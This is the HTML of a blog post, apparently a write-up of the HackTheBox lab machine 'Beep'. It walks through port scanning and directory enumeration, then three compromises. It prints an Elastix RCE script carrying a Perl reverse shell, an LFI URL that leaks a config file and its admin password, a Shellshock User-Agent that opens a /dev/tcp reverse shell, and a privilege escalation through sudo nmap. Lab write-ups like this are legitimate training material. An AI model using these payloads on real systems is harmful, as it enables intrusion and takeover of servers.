<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Beep | PwndSide</title><meta name=keywords content="privesc,web,linux,ssh"><meta name=description content="Linux machine with a communications server software that brings IP PBX, email, IM, faxing and collaboration functionality into a single platform and a lot of ways to exploit them as well."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Beep"><meta property="og:description" content="Linux machine with a communications server software that brings IP PBX, email, IM, faxing and collaboration functionality into a single platform and a lot of ways to exploit them as well."><meta property="og:type" content="article"><meta property="og:url" content="https://pwndside.github.io/posts/beep-htb/"><meta property="og:image" content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-07-10T23:51:29+02:00"><meta property="article:modified_time" content="2023-07-10T23:51:29+02:00"><meta property="og:site_name" content="PwndSide"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="Beep"><meta name=twitter:description content="Linux machine with a communications server software that brings IP PBX, email, IM, faxing and collaboration functionality into a single platform and a lot of ways to exploit them as well."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://pwndside.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Beep","item":"https://pwndside.github.io/posts/beep-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Beep","name":"Beep","description":"Linux machine with a communications server software that brings IP PBX, email, IM, faxing and collaboration functionality into a single platform and a lot of ways to exploit them as well.","keywords":["privesc","web","linux","ssh"],"articleBody":"Room Information Room name: Beep Difficulty level: Easy Room link: https://app.hackthebox.com/machines/Beep Tools Used Nmap Searchsploit BurpSuite SSH Port Scanning PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAI04jN+Sn7/9f2k+5UteAWn8KKj3FRGuF4LyeDmo/xxuHgSsdCjYuWtNS8m7stqgNH5edUu8vZ0pzF/quX5kphWg/UOz9weGeGyzde5lfb8epRlTQ2kfbP00l+kq9ztuWaXOsZQGcSR9iKE4lLRJhRCLYPaEbuxKnYz4WhAv4yD5AAAAFQDXgQ9BbvoxeDahe/ksAac2ECqflwAAAIEAiGdIue6mgTfdz/HikSp8DB6SkVh4xjpTTZE8L/HOVpTUYtFYKYj9eG0W1WYo+lGg6SveATlp3EE/7Y6BqdtJNm0RfR8kihoqSL0VzKT7myerJWmP2EavMRPjkbXw32fVBdCGjBqMgDl/QSEn2NNDu8OAyQUVBEHrE4xPGI825qgAAACANnqx2XdVmY8agjD7eFLmS+EovCIRz2+iE+5chaljGD/27OgpGcjdZNN+xm85PPFjUKJQuWmwMVTQRdza6TSp9vvQAgFh3bUtTV3dzDCuoR1D2Ybj9p/bMPnyw62jgBPxj5lVd27LTBi8IAH2fZnct7794Y3Ge+5r4Pm8Qbrpy68= | 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA) |_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA4SXumrUtyO/pcRLwmvnF25NG/ozHsxSVNRmTwEf7AYubgpAo4aUuvhZXg5iymwTcZd6vm46Y+TX39NQV/yT6ilAEtLbrj1PLjJl+UTS8HDIKl6QgIb1b3vuEjbVjDj1LTq0Puzx52Es0/86WJNRVwh4c9vN8MtYteMb/dE2Azk0SQMtpBP+4Lul4kQrNwl/qjg+lQ7XE+NU7Va22dpEjLv/TjHAKImQu2EqPsC99sePp8PP5LdNbda6KHsSrZXnK9hqpxnwattPHT19D94NHVmMHfea9gXN3NCI3NVfDHQsxhqVtR/LiZzpbKHldFU0lfZYH1aTdBfxvMLrVhasZcw== 25/tcp open smtp syn-ack ttl 63 Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http syn-ack ttl 63 Apache httpd 2.2.3 |_http-title: Did not follow redirect to https://10.10.10.7/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.2.3 (CentOS) 110/tcp open pop3 syn-ack ttl 63 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_pop3-capabilities: LOGIN-DELAY(0) UIDL APOP RESP-CODES EXPIRE(NEVER) IMPLEMENTATION(Cyrus POP3 server v2) USER STLS PIPELINING TOP AUTH-RESP-CODE 111/tcp open rpcbind syn-ack ttl 63 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 875/udp status |_ 100024 1 878/tcp status 143/tcp open imap syn-ack ttl 63 Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_imap-capabilities: CATENATE LITERAL+ SORT=MODSEQ URLAUTHA0001 MAILBOX-REFERRALS CONDSTORE UIDPLUS ATOMIC IDLE LISTEXT MULTIAPPEND IMAP4rev1 CHILDREN X-NETSCAPE Completed ANNOTATEMORE ACL THREAD=REFERENCES STARTTLS THREAD=ORDEREDSUBJECT OK NAMESPACE QUOTA SORT BINARY LIST-SUBSCRIBED IMAP4 RIGHTS=kxte UNSELECT NO ID RENAME 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.2.3 ((CentOS)) |_http-title: Elastix - Login page | http-robots.txt: 1 disallowed entry |_/ |_http-favicon: Unknown favicon MD5: 80DCC71362B27C7D0E608B0890C05E9F |_ssl-date: 2023-07-04T11:40:21+00:00; 0s from scanner time. |_http-server-header: Apache/2.2.3 (CentOS) | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain | Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2017-04-07T08:22:08 | Not valid after: 2018-04-07T08:22:08 | MD5: 621a:82b6:cf7e:1afa:5284:1c91:60c8:fbc8 | SHA-1: 800a:c6e7:065e:1198:0187:c452:0d9b:18ef:e557:a09f | -----BEGIN CERTIFICATE----- | MIIEDjCCA3egAwIBAgICfVUwDQYJKoZIhvcNAQEFBQAwgbsxCzAJBgNVBAYTAi0t | MRIwEAYDVQQIEwlTb21lU3RhdGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQK | ExBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxV | bml0MR4wHAYDVQQDExVsb2NhbGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0B | CQEWGnJvb3RAbG9jYWxob3N0LmxvY2FsZG9tYWluMB4XDTE3MDQwNzA4MjIwOFoX | DTE4MDQwNzA4MjIwOFowgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh | dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u | MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh | bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0 | LmxvY2FsZG9tYWluMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3e4HhLYPN | gwJ4eKlW/UpmemPfK/a3mcafSqx/AJP34OC0Twj/cZNaqFPLOWfNjcq4mmiV++9a | oJCkj4apDkyICI1emsrPaRdrlA/cCXcn3nupfOgcfpBV4vqNfqorEqpJCO7T4bcp | Z6YHuxtRtP7gRJiE1ytAFP2jDvtvMqEWkwIDAQABo4IBHTCCARkwHQYDVR0OBBYE | FL/OLJ7hJVedlL5Gk0fYvo6bZkqWMIHpBgNVHSMEgeEwgd6AFL/OLJ7hJVedlL5G | k0fYvo6bZkqWoYHBpIG+MIG7MQswCQYDVQQGEwItLTESMBAGA1UECBMJU29tZVN0 | YXRlMREwDwYDVQQHEwhTb21lQ2l0eTEZMBcGA1UEChMQU29tZU9yZ2FuaXphdGlv | bjEfMB0GA1UECxMWU29tZU9yZ2FuaXphdGlvbmFsVW5pdDEeMBwGA1UEAxMVbG9j | YWxob3N0LmxvY2FsZG9tYWluMSkwJwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9z | dC5sb2NhbGRvbWFpboICfVUwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOB | gQA+ah2n+bomON94KgibPEVPpmW+8N6Sq3f4qDG54urTnPD39GrYHvMwA3B2ang9 | l3zta5tXYAVj22kiNM2si4bOMQsa6FZR4AEzWCq9tZS/vTCCRaT79mWj3bUvtDkV | 2ScJ9I/7b4/cPHDOrAKdzdKxEE2oM0cwKxSnYBJk/4aJIw== |_-----END CERTIFICATE----- | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 878/tcp open status syn-ack ttl 63 1 (RPC #100024) 993/tcp open ssl/imap syn-ack ttl 63 Cyrus imapd |_imap-capabilities: CAPABILITY 995/tcp open pop3 syn-ack ttl 63 Cyrus pop3d 3306/tcp open mysql syn-ack ttl 63 MySQL (unauthorized) 4190/tcp open sieve syn-ack ttl 63 Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap) 4445/tcp open upnotifyp? syn-ack ttl 63 4559/tcp open hylafax syn-ack ttl 63 HylaFAX 4.3.10 5038/tcp open asterisk syn-ack ttl 63 Asterisk Call Manager 1.1 10000/tcp open http syn-ack ttl 63 MiniServ 1.570 (Webmin httpd) |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1). | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341 Service Info: Hosts: beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix We have a bunch of ports in this machine let‚Äôs see what we are handling:\nFirst we have the port 22 for ssh service, maybe interesting with a valid credentials\nThe ports 80, 443 and 10000 are running web services the first one redirects to the 443 port so we only have two web services. We can observe that the linux machine is a CentOS\nThe ports 25, 110, 143 are running mail services and the ports 993, 995 are mail services too but from a open source called Cyrus, his version is shown at the port 4190 as Cyrus timsieved 2.3.7.\nThe port 4559 is running a FAX service named HylaFAX 4.3.10\nAsterix is open source Call Manager running at port 5038\nThe only port that I don‚Äôt find any info it‚Äôs the port 4445 which runs the upnotifyp? service.\nEnumeration We have a lot of ways to start to enumerate but my favourite is to start with the web services.\nThe first one shows a Elastix login page,I tried the common and the default credentials and nothing seems to work.\nElastix is a unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality which fits well what the previous nmap scan.\nLet‚Äôs do a quick fuzz to see what we have. I used the -k flag to avoid the ssl check.\ngobuster dir -u https://$IP/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -f -k -o fuzz | tee fuzz.save =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://10.10.10.7/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /Users/aymanboulaichdahhou/Documents/wordlists/KaliLists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Add Slash: true [+] Timeout: 10s =============================================================== 2023/07/10 13:50:09 Starting gobuster in directory enumeration mode =============================================================== /.hta/ (Status: 403) [Size: 283] /.htaccess/ (Status: 403) [Size: 288] /.htpasswd/ (Status: 403) [Size: 288] /admin/ (Status: 302) [Size: 0] [--\u003e config.php] /cgi-bin/ (Status: 403) [Size: 286] /cgi-bin// (Status: 403) [Size: 287] /configs/ (Status: 200) [Size: 1282] /error/ (Status: 403) [Size: 284] /help/ (Status: 200) [Size: 346] /icons/ (Status: 200) [Size: 31006] /images/ (Status: 200) [Size: 29898] /index.php/ (Status: 200) [Size: 1785] /lang/ (Status: 200) [Size: 4788] /libs/ (Status: 200) [Size: 7798] /mail/ (Status: 200) [Size: 2411] /mailman/ (Status: 403) [Size: 286] /modules/ (Status: 200) [Size: 13132] /panel/ (Status: 200) [Size: 1065] /pipermail/ (Status: 200) [Size: 698] /static/ (Status: 200) [Size: 1276] /themes/ (Status: 200) [Size: 3172] /var/ (Status: 200) [Size: 1236] =============================================================== 2023/07/10 13:54:08 Finished =============================================================== The directories leaks the FreePBX version which is 2.8.1.4.\nIf we search Elastix in searchsploit we have a lot of useful exploits.\nThe only that definitely doesn‚Äôt gonna work is the XSS exploit because is a client side vulnerability. The two exploits which are so interesting are the RCE one and the LFI one. The PHP injection is a good one but is using the same file as the LFI and I will still consider it in case of the LFI doesn‚Äôt work.The Blind SQL Injection is on the iridium_threed.php script that the server doesn‚Äôt seem to load.\nNow let‚Äôs see the website located at port 10000.\nWe can see again a login webpage, I tried to log in again without success. We can see that the webpage is running webmin. I am going to search some exploits for it.\nA lot of exploits mention cgi so maybe has a Shellshock vulnerability exploited previously in Shocker machine.\nIt‚Äôs important to mention that the two websites have a ssl security problem with the certificate and I only can access them with Chromium.\nExploiting So we have three possible ways to exploit the machine, maybe more but let‚Äôs focus on what we have.\nFirst Way The first one is the RCE, let‚Äôs download the python script and see what is inside.\nsearchsploit -m \"18650\" The script is a url encoded reverse shell that is sent to the remote machine\nimport urllib import ssl rhost=\"10.10.10.7\" lhost=\"10.10.14.20\" lport=4444 extension=\"1000\" ssl._create_default_https_context = ssl._create_unverified_context # Reverse shell payload url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c\u0026callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A' urllib.urlopen(url) If we change the values of rhost and lhost,lport we can run the exploit and what happen. As it a reverse shell we need to perform a netcat listener\nnc -lv 4444 A SSL error occurred at moment of execution, I tried to change the script without success. Let‚Äôs try to make a proxy listener with burp to allow to send the malicious request to us and later send it to the machine. That allows us to send the request without ssl and resend it with ssl thanks to the burp listener\nFirst we are changing the rhost value to localhost and the url from https to http.\nOnce we made this change, in BurpSuite with sudo privileges we need to go to Proxy \u003e Options \u003e Proxy Listeners \u003e Add and in the Blinding page we put the port 80 and in the Request Handling we need to change the host to 10.10.10.7 and the port to 443 and check the SSL use.\nWith this done let‚Äôs put a the same nc listener and see if that works well.\nNothing seems to happen but looking at HTTP history, this time with the Burp Listener we can have more info of the error.\nWe can see that the problem is the PBX extension which seems is not a working one.\nThere is a utility called SIPVicious which is a open source VoIP security testing toolset which allow us to identify a working extension line on a PBX with their tool svwar.\nsipvicious_svwar -m INVITE -e100-500 $IP -m : allow us to specify the method\n-e : allow us to define a extension range\nWARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night +-----------+----------------+ | Extension | Authentication | +===========+================+ | 233 | reqauth | +-----------+----------------+ The results shows that the 233 is a valid extension for the attack.\nNow let‚Äôs run all again with the changes.\nFirst once we spawn a bash with python -c 'import pty; pty.spawn(\"/bin/bash\") then lets keep the nc in background with ctrl^z, once done we use stty raw -echo and then fg to return to the web shell but fully interactive this time.\nWe have a shell now but without root privilege\nLet‚Äôs cat the user flag\nIf we use sudo -l we can see that we have a lot of ways to be a root\nI choose nmap one. We can find a payload in GTFOBins\nsudo nmap --interactive nmap\u003e !sh This one works for me, let‚Äôs cat the root‚Äôs flag\nSecond Way Let‚Äôs move to the second way to own this machine, the LFI vulnerability.\nsearchsploit -m \"37637\" If we look at the exploit we can see that they use the url ‚Äúhttps://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00\u0026module=Accounts\u0026action‚Äù to exploit the vuln. So let‚Äôs see what we can find in this page.\nThe page shows a file so we can deduce that there is a LFI vulnerability. There are a bunch of usernames and passwords, one of them caught my attention.\nARI_ADMIN_USERNAME=admin # This is the default admin password to allow an administrator to login to ARI bypassing all security. ARI_ADMIN_PASSWORD=jEhdIekWmdjE # Change this to a secure password. I tried to log with ssh in the machine with admin@10.10.10.7 and the password found but without success. My ssh key algorithms doesn‚Äôt match with the machine ones so I perform this command to be able to connect with ssh.\nssh -o KexAlgorithms=+diffie-hellman-group-exchange-sha1 -o HostKeyAlgorithms=+ssh-dss admin@10.10.10.7 Let‚Äôs move to /etc/passwd directory to see what user are in the machine\nLet‚Äôs try to log in ssh as root with the previous credentials.\nWe have gained access.\nThird Way Finally the last form to gain access, with the shellsock vulnerability.\nWe are going to exploit the main page.\nThe basis of this vuln is to edit the http request to modify the User-Agent header to ‚Äú() { :; }; /bin/bash -i \u003e\u0026 /dev/tcp/10.10.14.20/4444 0\u003e\u00261‚Äù we can do that with burp and allows us with a listening port to have a reverse shell.\nThis pictures shows so well how really works.\nLet‚Äôs set the listener and send the request.\nnc -lv 4444 Lessons Learned What insights did you gain from the room?\nHow works a VoIP with PBX and how to exploit them as well as how to exploit a LFI vulnerability. The RCE and LFI can be avoided with a good URL sanitation.\nWere there any novel tools or techniques employed?\nThe use of svwar which helps me to identify possible extensions for PBX.\nThank you for reading, and happy hacking! üòÑ\n","wordCount":"1869","inLanguage":"en","image":"https://pwndside.github.io/%3Cimage%20path/url%3E","datePublished":"2023-07-10T23:51:29+02:00","dateModified":"2023-07-10T23:51:29+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://pwndside.github.io/posts/beep-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"https://pwndside.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://pwndside.github.io/ accesskey=h title="PwndSide (Alt + H)"><img src=https://pwndside.github.io/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://pwndside.github.io/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=https://pwndside.github.io/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=https://pwndside.github.io/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://pwndside.github.io/>Home</a>&nbsp;¬ª&nbsp;<a href=https://pwndside.github.io/posts/>Posts</a></div><h1 class=post-title>Beep</h1><div class=post-description>Linux machine with a communications server software that brings IP PBX, email, IM, faxing and collaboration functionality into a single platform and a lot of ways to exploit them as well.</div><div class=post-meta><span title='2023-07-10 23:51:29 +0200 CEST'>July 10, 2023</span>&nbsp;¬∑&nbsp;9 min&nbsp;¬∑&nbsp;1869 words&nbsp;¬∑&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/beep-htb.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploiting>Exploiting</a><ul><li><a href=#first-way>First Way</a></li><li><a href=#second-way>Second Way</a></li><li><a href=#third-way>Third Way</a></li></ul></li><li><a href=#lessons-learned>Lessons Learned</a></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Beep</li><li>Difficulty level: Easy</li><li>Room link: <a href=https://app.hackthebox.com/machines/Beep>https://app.hackthebox.com/machines/Beep</a></li></ul><p><img loading=lazy src=/HTB/beep-icon.png alt=Untitled></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>Nmap</li><li>Searchsploit</li><li>BurpSuite</li><li>SSH</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT      STATE SERVICE    REASON         VERSION
</span></span><span class=line><span class=cl>22/tcp    open  ssh        syn-ack ttl <span class=m>63</span> OpenSSH 4.3 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>1024</span> ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 <span class=o>(</span>DSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-dss AAAAB3NzaC1kc3MAAACBAI04jN+Sn7/9f2k+5UteAWn8KKj3FRGuF4LyeDmo/xxuHgSsdCjYuWtNS8m7stqgNH5edUu8vZ0pzF/quX5kphWg/UOz9weGeGyzde5lfb8epRlTQ2kfbP00l+kq9ztuWaXOsZQGcSR9iKE4lLRJhRCLYPaEbuxKnYz4WhAv4yD5AAAAFQDXgQ9BbvoxeDahe/ksAac2ECqflwAAAIEAiGdIue6mgTfdz/HikSp8DB6SkVh4xjpTTZE8L/HOVpTUYtFYKYj9eG0W1WYo+lGg6SveATlp3EE/7Y6BqdtJNm0RfR8kihoqSL0VzKT7myerJWmP2EavMRPjkbXw32fVBdCGjBqMgDl/QSEn2NNDu8OAyQUVBEHrE4xPGI825qgAAACANnqx2XdVmY8agjD7eFLmS+EovCIRz2+iE+5chaljGD/27OgpGcjdZNN+xm85PPFjUKJQuWmwMVTQRdza6TSp9vvQAgFh3bUtTV3dzDCuoR1D2Ybj9p/bMPnyw62jgBPxj5lVd27LTBi8IAH2fZnct7794Y3Ge+5r4Pm8Qbrpy68<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA4SXumrUtyO/pcRLwmvnF25NG/ozHsxSVNRmTwEf7AYubgpAo4aUuvhZXg5iymwTcZd6vm46Y+TX39NQV/yT6ilAEtLbrj1PLjJl+UTS8HDIKl6QgIb1b3vuEjbVjDj1LTq0Puzx52Es0/86WJNRVwh4c9vN8MtYteMb/dE2Azk0SQMtpBP+4Lul4kQrNwl/qjg+lQ7XE+NU7Va22dpEjLv/TjHAKImQu2EqPsC99sePp8PP5LdNbda6KHsSrZXnK9hqpxnwattPHT19D94NHVmMHfea9gXN3NCI3NVfDHQsxhqVtR/LiZzpbKHldFU0lfZYH1aTdBfxvMLrVhasZcw<span class=o>==</span>
</span></span><span class=line><span class=cl>25/tcp    open  smtp       syn-ack ttl <span class=m>63</span> Postfix smtpd
</span></span><span class=line><span class=cl><span class=p>|</span>_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
</span></span><span class=line><span class=cl>80/tcp    open  http       syn-ack ttl <span class=m>63</span> Apache httpd 2.2.3
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to https://10.10.10.7/
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.2.3 <span class=o>(</span>CentOS<span class=o>)</span>
</span></span><span class=line><span class=cl>110/tcp   open  pop3       syn-ack ttl <span class=m>63</span> Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
</span></span><span class=line><span class=cl><span class=p>|</span>_pop3-capabilities: LOGIN-DELAY<span class=o>(</span>0<span class=o>)</span> UIDL APOP RESP-CODES EXPIRE<span class=o>(</span>NEVER<span class=o>)</span> IMPLEMENTATION<span class=o>(</span>Cyrus POP3 server v2<span class=o>)</span> USER STLS PIPELINING TOP AUTH-RESP-CODE
</span></span><span class=line><span class=cl>111/tcp   open  rpcbind    syn-ack ttl <span class=m>63</span> <span class=m>2</span> <span class=o>(</span>RPC <span class=c1>#100000)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> rpcinfo:
</span></span><span class=line><span class=cl><span class=p>|</span>   program version    port/proto  service
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100000</span>  <span class=m>2</span>            111/tcp   rpcbind
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100000</span>  <span class=m>2</span>            111/udp   rpcbind
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100024</span>  <span class=m>1</span>            875/udp   status
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>100024</span>  <span class=m>1</span>            878/tcp   status
</span></span><span class=line><span class=cl>143/tcp   open  imap       syn-ack ttl <span class=m>63</span> Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
